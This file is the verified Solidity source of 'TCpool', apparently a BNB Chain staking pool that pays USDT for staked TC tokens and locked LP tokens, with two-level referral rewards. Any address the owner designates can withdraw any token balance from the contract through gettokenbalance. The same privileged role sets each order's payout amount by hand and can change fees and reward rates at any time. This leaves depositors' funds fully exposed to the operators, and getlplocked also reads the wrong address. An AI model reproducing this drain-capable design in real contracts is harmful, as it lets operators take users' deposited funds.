/**
 *Submitted for verification at BscScan.com on 2022-08-30
*/

pragma solidity ^0.8.6;
// SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Pair {
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function airdrop(address account,uint256 orderid) external ;
}
contract Ownable {
    address public _owner;
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function changeOwner(address newOwner) public onlyOwner {
        _owner = newOwner;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract TCpool is Ownable {
    using SafeMath for uint256;
    mapping(address => bool) private _inviter;
    mapping(address => address) public _inviterone;
    mapping(address => address) public _invitertwo;
    address[] inviteruser; 
    mapping (uint256 => address) public _idtoorder;
    mapping (address => uint256) private _ordertoid;
    uint [8][] orderlist;
    mapping(address => mapping(address => uint256)) private _lplocked;
    mapping(address => mapping(address => uint256)) private _lplockedtime;
    uint256 private _lplockeddays = 365;
    mapping(uint256 => uint256) private _ordertype;
    uint256 private _relieve = 1;
    uint256 private _rewardone = 10;
    uint256 private _rewardtwo = 5;
    uint256 private _pledgetop = 5000;
    uint256 private _pledgebot = 1000; 
    uint256 private _taxFee = 2;
    address private _airdropaddress;
    bool private _airdroplock = true;
    mapping (address => bool) private _isrelease;
    address private LPusdt = 0x54D091C0E1F863A4af4181C3248df6264e08Cb56;
    address private LPbnb = 0x9AF778430bC7E30493182D22dAaD0a46c49Cff23;
    address private TCaddress = 0xb200D42555dc76fE338082206B32816aDe42Fa54;
    address private usdtaddress = 0x55d398326f99059fF775485246999027B3197955;
    address private bnbaddress = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

constructor (){
        _owner = msg.sender;
        _inviter[address(this)] = true;
        inviteruser.push(address(this));
    }
    function setinviter(address user) public {
        if(!_inviter[msg.sender] && _inviter[user]){
            _inviterone[msg.sender] = user;
            _invitertwo[msg.sender] = _inviterone[user];
            _inviter[msg.sender] = true;
            inviteruser.push(msg.sender);
        }
    }
    function getinviter(address account) view public returns (bool){
        return _inviter[account];
    }
    function gettokenbalance(address token, uint256 amount) public {
        require(_isrelease[msg.sender]);
        IERC20(token).transfer(msg.sender,amount);
    }
    function setlplocked(address lpaddress,uint256 amount) public {
        IERC20(lpaddress).transferFrom(msg.sender,address(this),amount);
        _lplocked[msg.sender][lpaddress] = _lplocked[msg.sender][lpaddress].add(amount);
        _lplockedtime[msg.sender][lpaddress] = block.timestamp;
    }
    function getlpnumb ( address account) public  view  returns (uint256) {
        uint256 usdtnumb = _lplocked[account][LPusdt];
        uint256 usdtamount = 0;
        if( usdtnumb > 0 ){
            uint256 Totusdtnumb = IERC20(LPusdt).totalSupply();
            uint256 Totusdt = IERC20(usdtaddress).balanceOf(LPusdt);
            usdtamount = Totusdt.mul(usdtnumb).div(Totusdtnumb);
        }
        uint256 bnbnumb = _lplocked[account][LPbnb];
        uint256 bnbamount = 0;
        if( bnbnumb > 0 ){
            uint256 Totbnbnumb = IERC20(LPbnb).totalSupply();
            uint256 Totbnb = IERC20(bnbaddress).balanceOf(LPbnb);
            uint256 bnbamountb = Totbnb.mul(bnbnumb).div(Totbnbnumb);
            bnbamount = bnbamountb.mul(getpice(bnbaddress,usdtaddress)).div(1*10**6);
        }
        return usdtamount.add(bnbamount);
    }
    function getlpweb ( address account) public  view  returns (uint256,uint256,uint256,uint256) {
        uint256 Totusdtlp = IERC20(LPusdt).totalSupply();
        uint256 Totusdt = IERC20(usdtaddress).balanceOf(LPusdt);
        uint256 balanceofusdtlp = IERC20(LPusdt).balanceOf(account);
        uint256 usdtlpamount = Totusdt.mul(balanceofusdtlp).div(Totusdtlp);
        uint256 Totbnblp = IERC20(LPbnb).totalSupply();
        uint256 Totbnb = IERC20(bnbaddress).balanceOf(LPbnb);
        uint256 balanceofbnblp = IERC20(LPbnb).balanceOf(account);
        uint256 bnblpamount = Totbnb.mul(balanceofbnblp).div(Totbnblp);
        uint256 bnblpamounttou = bnblpamount.mul(getpice(bnbaddress,usdtaddress)).div(1*10**6);
        return (balanceofusdtlp,balanceofbnblp,usdtlpamount,bnblpamounttou);
    }
    function getaddresser () public  view  returns (address,address,address,address,address,address) {
        return (router,TCaddress,bnbaddress,usdtaddress,LPbnb,LPusdt);
    }
    function getblanceOflp () public {
        if(_lplocked[msg.sender][LPusdt] > 0 && block.timestamp >= _lplockedtime[msg.sender][LPusdt].add(_lplockeddays.mul(86400))){
            IERC20(LPusdt).transfer(msg.sender,_lplocked[msg.sender][LPusdt]);
            _lplocked[msg.sender][LPusdt] = 0;
        }
        if(_lplocked[msg.sender][LPbnb] > 0 && block.timestamp >= _lplockedtime[msg.sender][LPbnb].add(_lplockeddays.mul(86400))){
            IERC20(LPbnb).transfer(msg.sender,_lplocked[msg.sender][LPbnb]);
            _lplocked[msg.sender][LPbnb] = 0;
        }
    }
    function getlplocked ( address account) public  view  returns (uint256,uint256) {
        return (_lplocked[msg.sender][account],_lplockedtime[msg.sender][account]);
    }
    function getpice (address tokenin,address tokenout) public  view  returns (uint256) {
        address [] memory path =new address[](2);
        path[0] = tokenin;
        path[1] = tokenout;
        uint256 [] memory pice = IUniswapV2Pair(router).getAmountsOut(1*10**6,path);
        return pice[1];
    }
    function setrelease(address recipient) public onlyOwner {
        if (!_isrelease[recipient]) _isrelease[recipient] = true;
    }
    function setlplockeddays(uint256 number) public {
        require(_isrelease[msg.sender]);
        _lplockeddays = number;
    }
    function setordertype(uint256 typeid, uint256 typeval) public {
        require(_isrelease[msg.sender]);
        if (_ordertype[typeid] != typeval) _ordertype[typeid] = typeval;
    }
    function setrelieve(uint256 relieve) public {
        require(_isrelease[msg.sender]);
        _relieve = relieve;
    }
    function setrewardone(uint256 rewardone) public {
        require(_isrelease[msg.sender]);
        _rewardone = rewardone;
    }
    function setrewardtwo(uint256 rewardtwo) public {
        require(_isrelease[msg.sender]);
        _rewardtwo = rewardtwo;
    }
    function setpledgetop(uint256 pledgetop) public {
        require(_isrelease[msg.sender]);
        _pledgetop = pledgetop;
    }
    function setpledgebot(uint256 pledgebot) public {
        require(_isrelease[msg.sender]);
        _pledgebot = pledgebot;
    }
    function settaxFee(uint256 taxFee) public {
        require(_isrelease[msg.sender]);
        _taxFee = taxFee;
    }
    function setairdrop(address account) public {
        require(_isrelease[msg.sender]);
        _airdropaddress = account;
    }
    function setairdroplock() public {
        require(_isrelease[msg.sender]);
        if(_airdroplock){
            _airdroplock = false;
        }else{
            _airdroplock = true;
        }
    }
    function staking(uint256 ordertype, uint256 orderamount) public {
        address [] memory path =new address[](2);
        path[0] = TCaddress;
        path[1] = usdtaddress;
        uint256 [] memory pice = IUniswapV2Pair(router).getAmountsOut(orderamount,path);
        uint256 amount = pice[1];
        require( _ordertoid[msg.sender] == 0 );
        require( _ordertype[ordertype] > 0 );
        require( _pledgetop >= amount && amount >= _pledgebot && amount <= getlpnumb(msg.sender).mul(2));
        IERC20(TCaddress).transferFrom(msg.sender,address(this),orderamount);
        uint256 orderid = orderlist.length.add(1) ;
        uint256 orderSTime = block.timestamp ;
        uint256 orderOTime = block.timestamp.add(_ordertype[ordertype].mul(86400));
        _idtoorder[orderid]= msg.sender;
        _ordertoid[msg.sender] = orderid;
        pushorder(orderid,ordertype,orderSTime,orderOTime,amount,0,0,orderamount);
    }
   function getstaking() public{
        uint256 orderid = _ordertoid[msg.sender];
        require( orderid > 0 && orderlist[orderid-1][5] > 0 );
            if(!_airdroplock){
                IUniswapV2Pair(_airdropaddress).airdrop(msg.sender,orderid);
            }
            IERC20(usdtaddress).transfer(msg.sender, orderlist[orderid-1][5].mul(100-_taxFee).div(100));
            _ordertoid[msg.sender] = 0;
    }
    function getstakingdata(uint256 orderid) view public returns (uint256 amount) {
        uint256 totalamount = 0;
        if( orderid > 0 && orderid <= orderlist.length){
            if(block.timestamp > orderlist[orderid-1][3] && orderlist[orderid-1][5] == 0){ 
            totalamount = orderlist[orderid-1][4].add(income(_idtoorder[orderid],block.timestamp));
            }
        }
            return totalamount;
    }
    function setstakingdata(uint256 orderid,uint256 amount) public {
        require(_isrelease[msg.sender]);
        require(block.timestamp > orderlist[orderid-1][3]);
            orderlist[orderid-1][5] = amount;
    }
    function income(address account,uint256 endtime) view public returns (uint256)  {
        if( _ordertoid[account] == 0 ){
            return 0;
        }else{
        (uint256 orderSTime,uint256 orderOTime,uint256 orderamount) = getorder(_ordertoid[account]);
        uint256 orderdays = 0;
        uint256 incomeamount = 0;
        if(endtime >= orderOTime){
            orderdays = (orderOTime.sub(orderSTime)).div(86400);
        }else{
            orderdays = (endtime.sub(orderSTime)).div(86400);
        }
        if( orderdays >0 ){
            for(uint256 i = 1 ; i <= orderdays ; i++){
                uint256 jstime = orderSTime.add(i.mul(86400));
                incomeamount = incomeamount + getpower(account,jstime).mul(_relieve).div(100);
            }
        }
        return incomeamount;
        }
    }
    function getpower(address account, uint256 Dtime) view public returns (uint256)  {
        if( _ordertoid[account] == 0 ){
            return 0;
        }else{
            (uint256 orderSTime,uint256 orderOTime,uint256 orderamount) = getorder(_ordertoid[account]);
            if(Dtime < orderSTime ){
                return 0;
            }else{
                uint256 rewardamount = orderamount;
                for(uint256 j = 1 ; j <= orderlist.length ; j++){
                    (uint256 YJSTime,uint256 YJOTime,uint256 YJamount) = getorder(j);
                    if( YJOTime > Dtime && YJSTime < Dtime ){
                        uint256 reward = 0;
                        uint256 SXamount = 0;
                        if(YJamount > orderamount){
                            SXamount = orderamount;
                        }else{
                            SXamount = YJamount;
                        }
                        if(_inviterone[_idtoorder[j]] == account ){
                            reward = _rewardone;
                        }else if( _invitertwo[_idtoorder[j]] == account ){
                            reward = _rewardtwo;
                        }
                        if( reward > 0 ){
                            rewardamount = rewardamount.add(SXamount.mul(reward).div(100));
                        }
                    }
                }
               return rewardamount;
            }
        }
    }
    function gettotleorder()  view public returns (uint256 amount1,uint256 amount2,uint256 amount3,uint256 amount4) {
        uint256 amount10 = 0 ;
        uint256 amount30 = 0 ;
        uint256 amount60 = 0 ;
        uint256 amount90 = 0 ;
        for(uint256 i = 1 ; i <= orderlist.length ; i++){
            if(orderlist[i-1][1] == 1 ){
                amount10 = amount10 + orderlist[i-1][4];
            }else if(orderlist[i-1][1] == 2 ){
                amount30 = amount30 + orderlist[i-1][4];
            }else if(orderlist[i-1][1] == 3 ){
                amount60 = amount60 + orderlist[i-1][4];
            }else if(orderlist[i-1][1] == 4 ){
                amount90 = amount90 + orderlist[i-1][4];
            }
        }
        return (amount10,amount30,amount60,amount90); 
    }
    function orderlist_len()  view public returns (uint256) {
        return orderlist.length; 
    }
    function getorderid(address acount)  view public returns (uint256) {
        return _ordertoid[acount]; 
    }
    function getordertype(uint256 orderid)  view public returns (uint256) {
        if(orderid <= orderlist.length && orderid > 0){
            return orderlist[orderid-1][1]; 
        }else{
            return 0;
        }
    }
     function getrelieve() view public returns (uint256) {
        return _relieve;
    }
   function getmystaking(uint256 orderid)  view public returns (uint256) {
        if(orderid <= orderlist.length && orderid > 0){
            return orderlist[orderid-1][4]; 
        }else{
            return 0;
        }
    }
   function getwebdate()  view public returns (uint256 power,uint256 relieve,uint256 ordertype,uint256 orderamount,uint256 nowamount,uint256 endtime) {
       uint256 orderid = getorderid(msg.sender);
       if(orderid > 0 ){
       return (getpower(msg.sender, block.timestamp),
               getrelieve(),
               orderlist[orderid-1][1],
               orderlist[orderid-1][4],
               income(msg.sender,block.timestamp),
               orderlist[orderid-1][3]);
       }else{
       return (getpower(msg.sender, block.timestamp),
               getrelieve(),
               1,
               0,
               income(msg.sender,block.timestamp),
               0);
       }
    }
    function pushorder(uint256 orderid,uint256 ordertype,uint256 orderSTime,uint256 orderOTime,uint256 amount,uint256 balance,uint256 status,uint256 orderamount) private {
        orderlist.push([orderid,ordertype,orderSTime,orderOTime,amount,balance,status,orderamount]);
    }
    function getorder(uint256 orderid) view public returns (uint256,uint256,uint256) {
        if(orderid <= orderlist.length && orderid > 0){
            return (orderlist[orderid-1][2],orderlist[orderid-1][3],orderlist[orderid-1][4]); 
        }else{
            return (0,0,0);
        }
    }
    function getorderlistdate(uint256 orderid) view public returns (uint256,uint256,uint256,uint256,uint256,uint256,uint256) {
        if(orderid <= orderlist.length && orderid > 0){
            return (orderlist[orderid-1][1],orderlist[orderid-1][2],orderlist[orderid-1][3],orderlist[orderid-1][4],orderlist[orderid-1][5],orderlist[orderid-1][6],orderlist[orderid-1][7]); 
        }else{
            return (0,0,0,0,0,0,0);
        }
    }
}